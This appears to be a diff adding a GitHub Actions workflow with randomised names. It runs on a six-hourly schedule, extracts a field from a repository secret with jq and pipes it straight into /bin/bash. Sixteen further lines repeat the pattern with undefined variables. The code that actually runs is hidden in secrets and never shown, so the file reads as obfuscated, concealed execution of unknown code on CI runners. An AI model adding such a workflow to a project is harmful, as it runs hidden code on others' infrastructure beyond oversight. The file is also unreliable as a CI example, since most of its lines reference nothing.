@@ -1,0 +1,34 @@
+name: wangxianglong4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangxianglong4567
+        env:
+          hl54: ${{ secrets.hl54 }}
+        run: |
+          echo $hl54 | jq -r .yndz576 | /bin/bash
+          echo $j487 | jq -r .r27 | /bin/bash
+          echo $ndi4360 | jq -r .zufk126 | /bin/bash
+          echo $jmfu85859 | jq -r .zxe20 | /bin/bash
+          echo $lz02 | jq -r .alffu7560 | /bin/bash
+          echo $e55505 | jq -r .g2016 | /bin/bash
+          echo $ilv3634 | jq -r .f3 | /bin/bash
+          echo $mercc486 | jq -r .fu3 | /bin/bash
+          echo $fhs7 | jq -r .vwlec9722 | /bin/bash
+          echo $mfqjj11415 | jq -r .q98264 | /bin/bash
+          echo $oda42 | jq -r .ssuxh63768 | /bin/bash
+          echo $y5282 | jq -r .x6 | /bin/bash
+          echo $xo19 | jq -r .nccjz2 | /bin/bash
+          echo $l62322 | jq -r .vtbwf2322 | /bin/bash
+          echo $g717 | jq -r .f3094 | /bin/bash
+          echo $eiggw5 | jq -r .zhgw500 | /bin/bash
+          echo $iawyj3367 | jq -r .wjqym8995 | /bin/bash
+
